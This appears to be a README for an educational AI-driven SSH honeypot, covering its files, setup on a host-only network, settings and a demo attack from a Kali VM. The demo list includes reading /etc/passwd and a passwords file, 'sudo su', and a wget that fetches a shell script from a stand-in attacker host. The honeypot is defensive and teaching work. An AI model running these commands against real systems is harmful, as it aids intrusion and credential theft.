AI HONEYPOT
===========

An AI-powered SSH honeypot. A fake Linux server accepts SSH logins from anyone.
Every command the attacker types is answered by an AI that pretends to be a real
server, and every action is logged. A live dashboard shows what the attacker is
doing, classifies each command, and an AI writes a short incident summary.

Project files
-------------
  honeypot.py    fake SSH server (Paramiko)
  ai_engine.py   AI brain: realistic terminal replies and the attack summary
  analyzer.py    classifies each command (type and danger level)
  db.py          stores every event in a SQLite database
  dashboard.py   live web dashboard (Python standard library only)
  config.py      all settings

How it works
------------
  Attacker (Kali VM)  --ssh-->  Honeypot (fake server)  --asks-->  AI
                                       |
                                       +--> SQLite log --> Dashboard

Requirements
------------
  - Python 3.10 or newer
  - Libraries:  python -m pip install -r requirements.txt
  - A Kali Linux VM on a host-only network (VMware or VirtualBox)
  - Optional AI: Claude API key, or Ollama running locally

Setup and run
-------------
1. Install the libraries (inside the project folder):

     python -m pip install -r requirements.txt

2. Choose the AI (optional). Without any AI the honeypot uses canned replies.

   Claude API (Windows cmd):    set ANTHROPIC_API_KEY=your-key-here
   Claude API (PowerShell):     $env:ANTHROPIC_API_KEY="your-key-here"
   Ollama (free, local):        ollama pull qwen2.5:1.5b   (it is detected automatically)

3. Put the Kali VM on a Host-only network.
   Find the laptop's host-only IP with "ipconfig" (VMware: VMnet1, usually 192.168.136.1;
   VirtualBox: usually 192.168.56.1). By default only the 192.168.136. range may connect.
   If your range is different, set it before starting the honeypot:

     set ALLOWED_PREFIX=192.168.56.        (cmd)
     $env:ALLOWED_PREFIX="192.168.56."     (PowerShell)

4. Start the honeypot (terminal 1):

     python honeypot.py

   You should see: "Honeypot running on 0.0.0.0:2222 | AI provider: ..."
   If Windows Firewall asks, allow access on private networks.

5. Start the dashboard (terminal 2):

     python dashboard.py

   The browser opens http://localhost:8502

6. Attack it from Kali (use your laptop's host-only IP):

     nmap -p 2222 -sV 192.168.136.1
     ssh admin@192.168.136.1 -p 2222        (any password works)

   Then type commands such as:
     whoami
     id
     uname -a
     ls -la
     cat notes.txt
     cat passwords.txt
     cat /etc/passwd
     sudo su
     wget http://evil.example/shell.sh
     exit

7. Watch the dashboard update live, then press "Generate summary".

Demo tips
---------
  - Put the Kali window and the dashboard side by side on one screen.
  - Explain what a honeypot is, run the attack, then show the AI summary.
  - Point out that the AI generates new replies each time; they are not canned.

Settings (environment variables)
--------------------------------
  HONEYPOT_PORT      port of the fake SSH server (default 2222)
  ALLOWED_PREFIX     allowed client IP prefix (default 192.168.136.)
  AI_PROVIDER        auto | claude | ollama | offline
  ANTHROPIC_API_KEY  key for the Claude API
  CLAUDE_MODEL       Claude model name (default claude-haiku-5-5)
  OLLAMA_MODEL       Ollama model (default qwen2.5:1.5b)

Safety
------
  - Run this only on your own laptop and VM host-only network.
  - Never expose it to the internet or a public Wi-Fi, and never port-forward it.
  - For learning and research only. Do not deploy on systems you do not own.
  - Keep your API key private and never upload it to GitHub.

Troubleshooting
---------------
  - "Connection refused": is the honeypot running? Is the IP correct? Is the firewall allowing it?
  - Honeypot prints "[blocked] ...": the client IP is outside ALLOWED_PREFIX; set it correctly.
  - Every reply is "command not found": the AI provider is offline; check the key or Ollama.
  - Windows blocks pip.exe or a library: run "python -m pip ..." instead of "pip ...".
